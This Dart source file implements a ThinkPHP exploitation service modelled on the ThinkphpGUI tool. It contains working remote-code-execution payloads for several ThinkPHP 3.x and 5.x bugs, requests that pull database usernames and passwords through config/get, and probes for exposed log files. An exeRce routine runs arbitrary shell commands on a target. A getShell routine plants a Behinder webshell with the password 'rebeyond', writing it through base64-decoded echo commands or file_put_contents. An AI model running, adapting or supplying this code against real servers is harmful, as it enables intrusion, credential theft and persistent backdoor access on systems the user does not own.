import 'dart:convert';

import 'package:http/http.dart' as http;

/// ThinkPHP 漏洞利用核心逻辑（100% 复现 ThinkphpGUI）
/// 参考: https://github.com/Lotus6/ThinkphpGUI
class ThinkphpExpService {
  final Uri baseUri;
  final Duration timeout;

  ThinkphpExpService({
    required String url,
    this.timeout = const Duration(seconds: 10),
  }) : baseUri = Uri.parse(url.endsWith('/') ? url : '$url/');

  static const String _phpVersionCheck = 'PHP Version';
  static const String _tp5LogInfo = '[ info ]';
  static const String _tp5LogErr = '[ error ]';
  static const String _tp3LogInfo = 'INFO:';
  static const String _tp6LogCheck = 'RunTime';

  /// 默认模块检测顺序（与 ThinkphpGUI Module.java 一致）
  static const List<String> _defaultModules = ['manage', 'admin', 'api'];

  /// 将 form-urlencoded 字符串转为 Map，用于 POST body（触发 application/x-www-form-urlencoded）
  static Map<String, String> _formMap(String s) {
    final result = <String, String>{};
    for (final part in s.split('&')) {
      final idx = part.indexOf('=');
      if (idx > 0) {
        result[part.substring(0, idx)] = part.substring(idx + 1);
      } else if (part.isNotEmpty) {
        result[part] = '';
      }
    }
    return result;
  }

  /// 检测可用模块（index/manage/admin/api）
  Future<String> _getModule() async {
    final client = http.Client();
    try {
      for (final mod in _defaultModules) {
        try {
          final res = await client
              .get(Uri.parse('${baseUri}?s=/$mod'))
              .timeout(timeout);
          if (res.statusCode == 200) return mod;
        } catch (_) {}
      }
    } finally {
      client.close();
    }
    return 'index';
  }

  /// 1. ThinkPHP 5.0 RCE
  Future<ThinkphpResult> checkTp50() async {
    final mod = await _getModule();
    final urls = [
      '${baseUri}?s=/$mod/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1',
      '${baseUri}?s=/$mod/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()',
    ];
    for (final u in urls) {
      try {
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.0 RCE', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0 RCE', '');
  }

  /// 2. ThinkPHP 5.0.10 RCE
  Future<ThinkphpResult> checkTp5010() async {
    final mod = await _getModule();
    final base = '${baseUri}?s=$mod';
    final payloads = [
      '_method=__construct&method=get&filter[]=phpinfo&get[]=-1',
      's=-1&_method=__construct&method=get&filter[]=phpinfo',
    ];
    for (final p in payloads) {
      try {
        final res = await http
            .post(Uri.parse(base), body: _formMap(p))
            .timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.0.10 RCE', '$base Post: $p');
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0.10 RCE', '');
  }

  /// 3. ThinkPHP 5.0.22/5.1.29 RCE
  Future<ThinkphpResult> checkTp5022_5129() async {
    final mod = await _getModule();
    final urls = [
      '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1',
      '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()',
      '${baseUri}?s=/$mod/\\think\\view\\driver\\php/display&content= ',
    ];
    for (final u in urls) {
      try {
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.0.22/5.1.29 RCE', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0.22/5.1.29 RCE', '');
  }

  /// 4. ThinkPHP 5.0.23 RCE（需 captcha 路由）
  Future<ThinkphpResult> checkTp5023() async {
    final payloadUrl = '${baseUri}?s=captcha&test=-1';
    final payloads = [
      '_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1',
      '_method=__ConStruct&method=get&filter[]=call_user_func&get[0]=phpinfo',
      '_method=__construct&filter[]=phpinfo&method=GET&get[]=1',
    ];
    for (final p in payloads) {
      try {
        final res = await http
            .post(Uri.parse(payloadUrl), body: _formMap(p))
            .timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.0.23 RCE', '$payloadUrl Post: $p');
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0.23 RCE', '');
  }

  /// 5. ThinkPHP 5.0.24-5.1.30 RCE
  Future<ThinkphpResult> checkTp5024_5130() async {
    final mod = await _getModule();
    final urls = [
      '${baseUri}?s=$mod/\\think\\Request/input&filter[]=phpinfo&data=-1',
      '${baseUri}?s=/$mod/\\think\\request/input?data[]=phpinfo()&filter=assert',
    ];
    for (final u in urls) {
      try {
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 5.0.24-5.1.30 RCE', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.0.24-5.1.30 RCE', '');
  }

  /// 6. ThinkPHP 5.x 数据库信息泄露
  Future<ThinkphpResult> checkTp5Db() async {
    final mod = await _getModule();
    final urls = [
      '${baseUri}?s=$mod/think\\config/get&name=database.username',
      '${baseUri}?s=$mod/think\\config/get&name=database.hostname',
      '${baseUri}?s=$mod/think\\config/get&name=database.password',
      '${baseUri}?s=$mod/think\\config/get&name=database.database',
    ];
    try {
      String? username, hostname, password, database;
      final r0 = await http.get(Uri.parse(urls[0])).timeout(timeout);
      username = r0.body.length < 20 ? r0.body.trim() : null;
      final r1 = await http.get(Uri.parse(urls[1])).timeout(timeout);
      hostname = r1.body.length < 20 ? r1.body.trim() : null;
      final r2 = await http.get(Uri.parse(urls[2])).timeout(timeout);
      password = r2.body.length < 40 ? r2.body.trim() : null;
      final r3 = await http.get(Uri.parse(urls[3])).timeout(timeout);
      database = r3.body.length < 20 ? r3.body.trim() : null;
      if (username != null || hostname != null || password != null || database != null) {
        return ThinkphpResult(
          true,
          'ThinkPHP 5.x 数据库信息泄露',
          'username:$username hostname:$hostname password:$password database:$database',
        );
      }
    } catch (_) {}
    return ThinkphpResult(false, 'ThinkPHP 5.x 数据库信息泄露', '');
  }

  /// 7. ThinkPHP 5.x 日志泄露
  Future<ThinkphpResult> checkTp5Log() async {
    final now = DateTime.now();
    final y = now.year.toString();
    final m = now.month.toString().padLeft(2, '0');
    final d = now.day.toString().padLeft(2, '0');
    final urls = [
      '${baseUri}runtime/log/$y$m/${d}.log',
      '${baseUri}runtime/log/$y$m/${d}_cli.log',
      '${baseUri}runtime/log/$y$m/${d}_error.log',
      '${baseUri}runtime/log/$y$m/${d}_sql.log',
    ];
    for (final u in urls) {
      try {
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_tp5LogInfo) || res.body.contains(_tp5LogErr)) {
          return ThinkphpResult(true, 'ThinkPHP 5.x 日志泄露', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 5.x 日志泄露', '');
  }

  /// 8. ThinkPHP 3.x RCE
  Future<ThinkphpResult> checkTp3() async {
    final mod = await _getModule();
    final payload = '${baseUri}?s=$mod/\\think\\module/action/param1/\${@phpinfo()}';
    try {
      final res = await http.get(baseUri).timeout(timeout);
      if (res.body.contains(_phpVersionCheck)) {
        return ThinkphpResult(true, 'ThinkPHP 3.x RCE', payload);
      }
    } catch (_) {}
    return ThinkphpResult(false, 'ThinkPHP 3.x RCE', '');
  }

  /// 9. ThinkPHP 3.x 日志泄露
  Future<ThinkphpResult> checkTp3Log() async {
    final now = DateTime.now();
    final y = now.year.toString();
    final m = now.month.toString().padLeft(2, '0');
    final d = now.day.toString().padLeft(2, '0');
    final suffix1 = '${y.substring(2)}_${m}_$d.log';
    final suffix2 = '${(now.millisecondsSinceEpoch ~/ 1000).toString().substring(0, 10)}-${y.substring(2)}_${m}_$d.log';
    final bases = [
      '/Runtime/Logs/',
      '/Runtime/Logs/Home/',
      '/Runtime/Logs/Common/',
      '/App/Runtime/Logs/',
      '/App/Runtime/Logs/Home/',
      '/Application/Runtime/Logs/',
      '/Application/Runtime/Logs/Admin/',
      '/Application/Runtime/Logs/Home/',
      '/Application/Runtime/Logs/App/',
      '/Application/Runtime/Logs/Ext/',
      '/Application/Runtime/Logs/Api/',
      '/Application/Runtime/Logs/Test/',
      '/Application/Runtime/Logs/Common/',
      '/Application/Runtime/Logs/Service/',
    ];
    for (final base in bases) {
      for (final suffix in [suffix1, suffix2]) {
        try {
          final u = '${baseUri}$base$suffix'.replaceAll('//', '/');
          final res = await http.get(Uri.parse(u)).timeout(timeout);
          if (res.body.contains(_tp3LogInfo) || res.body.contains(_tp5LogErr)) {
            return ThinkphpResult(true, 'ThinkPHP 3.x 日志泄露', u);
          }
        } catch (_) {}
      }
    }
    return ThinkphpResult(false, 'ThinkPHP 3.x 日志泄露', '');
  }

  /// 10. ThinkPHP 3.x Log RCE
  Future<ThinkphpResult> checkTp3LogRce() async {
    final now = DateTime.now();
    final y = now.year.toString();
    final m = now.month.toString().padLeft(2, '0');
    final d = now.day.toString().padLeft(2, '0');
    final suffix = '${y.substring(2)}_${m}_$d.log';
    final payloadLog = '${baseUri}?m=Home&c=Index&a=index&test=-->%20<?php%20phpinfo();?>';
    final logRces = [
      'value[_filename]', 'info[_filename]', 'param[_filename]', 'name[_filename]',
      'array[_filename]', 'arr[_filename]', 'list[_filename]', 'page[_filename]',
      'menus[_filename]', 'var[_filename]', 'data[_filename]', 'module[_filename]',
    ];
    try {
      await http.get(Uri.parse(payloadLog)).timeout(timeout);
      for (final param in logRces) {
        final u = '${baseUri}?m=Home&c=Index&a=index&$param=./Application/Runtime/Logs/Home/$suffix';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_phpVersionCheck)) {
          return ThinkphpResult(true, 'ThinkPHP 3.x Log RCE', u);
        }
      }
    } catch (_) {}
    return ThinkphpResult(false, 'ThinkPHP 3.x Log RCE', '');
  }

  /// 11. ThinkPHP 6.x 日志泄露
  Future<ThinkphpResult> checkTp6Log() async {
    final now = DateTime.now();
    final y = now.year.toString();
    final m = now.month.toString().padLeft(2, '0');
    final d = now.day.toString().padLeft(2, '0');
    final suffix = '$y$m/$d.log';
    final bases = [
      '/runtime/log/',
      '/runtime/log/Home/',
      '/runtime/log/Common/',
      '/runtime/log/Admin/',
    ];
    for (final base in bases) {
      try {
        final u = '${baseUri}$base$suffix'.replaceAll('//', '/');
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        if (res.body.contains(_tp6LogCheck) || res.body.contains(_tp5LogErr)) {
          return ThinkphpResult(true, 'ThinkPHP 6.x 日志泄露', u);
        }
      } catch (_) {}
    }
    return ThinkphpResult(false, 'ThinkPHP 6.x 日志泄露', '');
  }

  // ========== 批量检测 ==========

  /// 检测单个漏洞类型
  Future<ThinkphpResult> checkSingle(ThinkphpVulnType type) async {
    switch (type) {
      case ThinkphpVulnType.tp50:
        return checkTp50();
      case ThinkphpVulnType.tp5010:
        return checkTp5010();
      case ThinkphpVulnType.tp5022_5129:
        return checkTp5022_5129();
      case ThinkphpVulnType.tp5023:
        return checkTp5023();
      case ThinkphpVulnType.tp5024_5130:
        return checkTp5024_5130();
      case ThinkphpVulnType.tp5Db:
        return checkTp5Db();
      case ThinkphpVulnType.tp5Log:
        return checkTp5Log();
      case ThinkphpVulnType.tp3:
        return checkTp3();
      case ThinkphpVulnType.tp3Log:
        return checkTp3Log();
      case ThinkphpVulnType.tp3LogRce:
        return checkTp3LogRce();
      case ThinkphpVulnType.tp6Log:
        return checkTp6Log();
    }
  }

  /// 检测多个漏洞类型
  Future<List<ThinkphpResult>> checkMultiple(List<ThinkphpVulnType> types) async {
    final results = <ThinkphpResult>[];
    for (final t in types) {
      results.add(await checkSingle(t));
    }
    return results;
  }

  /// 检测全部 RCE 漏洞
  Future<List<ThinkphpResult>> checkAllRce() async {
    return checkMultiple([
      ThinkphpVulnType.tp50,
      ThinkphpVulnType.tp5010,
      ThinkphpVulnType.tp5022_5129,
      ThinkphpVulnType.tp5023,
      ThinkphpVulnType.tp5024_5130,
      ThinkphpVulnType.tp3,
      ThinkphpVulnType.tp3LogRce,
    ]);
  }

  /// 检测全部漏洞（含信息泄露）
  Future<List<ThinkphpResult>> checkAll() async {
    return checkMultiple(ThinkphpVulnType.values);
  }

  // ========== RCE 命令执行 ==========

  /// 执行命令（需先通过 check 确定漏洞类型）
  Future<String?> exeRce(ThinkphpVulnType type, String cmd) async {
    final mod = await _getModule();
    final encodedCmd = Uri.encodeComponent(cmd);

    switch (type) {
      case ThinkphpVulnType.tp50:
        final u = '${baseUri}?s=/$mod/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=$encodedCmd';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return _extractBeforeHtml(res.body);

      case ThinkphpVulnType.tp5010:
        final base = '${baseUri}?s=$mod';
        final payload = 's=$encodedCmd&_method=__construct&method&filter[]=system';
        final res = await http.post(Uri.parse(base), body: _formMap(payload)).timeout(timeout);
        return _extractBeforeHtml(res.body);

      case ThinkphpVulnType.tp5022_5129:
        final u = '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=$encodedCmd';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return res.body;

      case ThinkphpVulnType.tp5023:
        final payloadUrl = '${baseUri}?s=captcha&test=-1';
        final payloads = [
          '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=$encodedCmd',
          's=$encodedCmd&_method=__construct&method=get&filter[]=system',
          's=$encodedCmd&_method=__construct&method&filter[]=system',
        ];
        for (final p in payloads) {
          final res = await http.post(Uri.parse(payloadUrl), body: _formMap(p)).timeout(timeout);
          final out = _extractBeforeHtml(res.body);
          if (out.isNotEmpty) return out;
        }
        return null;

      case ThinkphpVulnType.tp5024_5130:
        final u = '${baseUri}?s=$mod/\\think\\Request/input&filter=system&data=$encodedCmd';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return res.body;

      case ThinkphpVulnType.tp3:
        final u = '${baseUri}?s=$mod/\\think\\module/action/param1/{\${system(\$_GET[\'x\'])}}?x=$encodedCmd';
        final res = await http.get(Uri.parse(u)).timeout(timeout);
        return res.body;

      case ThinkphpVulnType.tp3LogRce:
        final now = DateTime.now();
        final suffix = '${now.year.toString().substring(2)}_${now.month.toString().padLeft(2, '0')}_${now.day.toString().padLeft(2, '0')}.log';
        final payloadLog = '${baseUri}?m=Home&c=Index&a=index&test=-->%20<?php%20system(\$_GET[\'x\']);?>';
        await http.get(Uri.parse(payloadLog)).timeout(timeout);
        final logRes = '${baseUri}?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/$suffix&x=$encodedCmd';
        final res = await http.get(Uri.parse(logRes)).timeout(timeout);
        return res.body.contains(_phpVersionCheck) ? res.body : null;

      default:
        return null;
    }
  }

  /// GetShell（写入 php_behinder.php，使用内置冰蝎马，密码 rebeyond）
  /// [shellContent] 为 assets/defaults/payloads/php_behinder.php 的内容
  Future<String?> getShell(ThinkphpVulnType type, String shellContent) async {
    final mod = await _getModule();
    const shellFile = 'php_behinder.php';
    const shellPass = 'rebeyond';

    // 用于 assert/file_put_contents 的 PHP 字符串转义：' -> \', \ -> \\
    final shellForAssert = shellContent.replaceAll(r'\', r'\\').replaceAll("'", r"\'");

    final shellEnc = Uri.encodeComponent(shellContent);
    final shellB64 = base64.encode(utf8.encode(shellContent));

    switch (type) {
      case ThinkphpVulnType.tp50:
        final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
        final u = '${baseUri}?s=/$mod/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=$cmd';
        await http.get(Uri.parse(u)).timeout(timeout);
        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
        if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
        return null;

      case ThinkphpVulnType.tp5010:
        final base = '${baseUri}?s=$mod';
        final assertCode = "file_put_contents('./$shellFile','$shellForAssert');";
        final payloads = [
          {'_method': '__construct', 'method': 'get', 'filter[]': 'assert', 'get[]': assertCode},
          {'s': assertCode, '_method': '__construct', 'method': '', 'filter[]': 'assert'},
        ];
        for (final body in payloads) {
          await http.post(Uri.parse(base), body: body).timeout(timeout);
          final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
        }
        return null;

      case ThinkphpVulnType.tp5022_5129:
        final contentEnc = Uri.encodeComponent(shellContent);
        final payloads = [
          '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=$shellFile&vars[1][]=$contentEnc',
          '${baseUri}?s=/$mod/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=$shellFile&vars[1][1]=$contentEnc',
          '${baseUri}?s=/$mod/\\think\\template\\driver\\file/write&cacheFile=$shellFile&content=$contentEnc',
        ];
        for (final u in payloads) {
          await http.get(Uri.parse(u)).timeout(timeout);
          final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
        }
        return null;

      case ThinkphpVulnType.tp5023:
        final payloadUrl = '${baseUri}?s=captcha&test=-1';
        final cmd = "echo '$shellB64'|base64 -d>$shellFile";
        // 优先使用 system（与 ThinkphpGUI 一致，更可靠）
        final systemPayloads = [
          {'_method': '__construct', 'filter[]': 'system', 'method': 'get', 'server[REQUEST_METHOD]': cmd},
          {'_method': '__construct', 'filter[]': 'system', 'method': 'GET', 'get[]': cmd},
        ];
        for (final body in systemPayloads) {
          await http.post(Uri.parse(payloadUrl), body: body).timeout(timeout);
          final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
        }
        // 备选：assert + file_put_contents（需传原始 PHP 代码，非 encoded）
        final assertCode = "file_put_contents('./$shellFile','$shellForAssert');";
        final assertPayloads = [
          {'_method': '__construct', 'filter[]': 'assert', 'method': 'GET', 'get[]': assertCode},
        ];
        for (final body in assertPayloads) {
          await http.post(Uri.parse(payloadUrl), body: body).timeout(timeout);
          final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
          if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
        }
        return null;

      case ThinkphpVulnType.tp5024_5130:
        final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
        final u = '${baseUri}?s=$mod/\\think\\Request/input&filter=system&data=$cmd';
        await http.get(Uri.parse(u)).timeout(timeout);
        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
        if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
        return null;

      case ThinkphpVulnType.tp3:
        // TP3 使用 system 执行命令写入
        final cmd = Uri.encodeComponent("echo '$shellB64'|base64 -d>$shellFile");
        final u = '${baseUri}?s=$mod/\\think\\module/action/param1/{\${system(\$_GET[\'x\'])}}?x=$cmd';
        await http.get(Uri.parse(u)).timeout(timeout);
        final check = await http.get(Uri.parse('$baseUri$shellFile')).timeout(timeout);
        if (check.statusCode == 200) return '$baseUri$shellFile Pass:$shellPass';
        return null;

      case ThinkphpVulnType.tp3LogRce:
        final now = DateTime.now();
        final suffix = '${now.year.toString().substring(2)}_${now.month.toString().padLeft(2, '0')}_${now.day.toString().padLeft(2, '0')}.log';
        final logShell = '${baseUri}?m=Home&c=Index&a=index&test=-->%20$shellEnc';
        await http.get(Uri.parse(logShell)).timeout(timeout);
        final logRes = '${baseUri}?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/$suffix';
        final check = await http.get(Uri.parse(logRes)).timeout(timeout);
        if (check.statusCode == 200) return '$logRes Pass:$shellPass';
        return null;

      default:
        return null;
    }
  }


  String _extractBeforeHtml(String body) {
    final idx = body.indexOf('<');
    if (idx <= 0) return body;
    final res = body.substring(0, idx).trim();
    return res.isEmpty ? body : res;
  }
}

enum ThinkphpVulnType {
  tp50,
  tp5010,
  tp5022_5129,
  tp5023,
  tp5024_5130,
  tp5Db,
  tp5Log,
  tp3,
  tp3Log,
  tp3LogRce,
  tp6Log,
}

extension ThinkphpVulnTypeExt on ThinkphpVulnType {
  String get label {
    switch (this) {
      case ThinkphpVulnType.tp50:
        return 'ThinkPHP 5.0 RCE';
      case ThinkphpVulnType.tp5010:
        return 'ThinkPHP 5.0.10 RCE';
      case ThinkphpVulnType.tp5022_5129:
        return 'ThinkPHP 5.0.22/5.1.29 RCE';
      case ThinkphpVulnType.tp5023:
        return 'ThinkPHP 5.0.23 RCE';
      case ThinkphpVulnType.tp5024_5130:
        return 'ThinkPHP 5.0.24-5.1.30 RCE';
      case ThinkphpVulnType.tp5Db:
        return 'ThinkPHP 5.x 数据库信息泄露';
      case ThinkphpVulnType.tp5Log:
        return 'ThinkPHP 5.x 日志泄露';
      case ThinkphpVulnType.tp3:
        return 'ThinkPHP 3.x RCE';
      case ThinkphpVulnType.tp3Log:
        return 'ThinkPHP 3.x 日志泄露';
      case ThinkphpVulnType.tp3LogRce:
        return 'ThinkPHP 3.x Log RCE';
      case ThinkphpVulnType.tp6Log:
        return 'ThinkPHP 6.x 日志泄露';
    }
  }

  bool get supportsRce {
    switch (this) {
      case ThinkphpVulnType.tp50:
      case ThinkphpVulnType.tp5010:
      case ThinkphpVulnType.tp5022_5129:
      case ThinkphpVulnType.tp5023:
      case ThinkphpVulnType.tp5024_5130:
      case ThinkphpVulnType.tp3:
      case ThinkphpVulnType.tp3LogRce:
        return true;
      default:
        return false;
    }
  }
}

class ThinkphpResult {
  final bool vulnerable;
  final String vulnName;
  final String detail;

  ThinkphpResult(this.vulnerable, this.vulnName, this.detail);
}
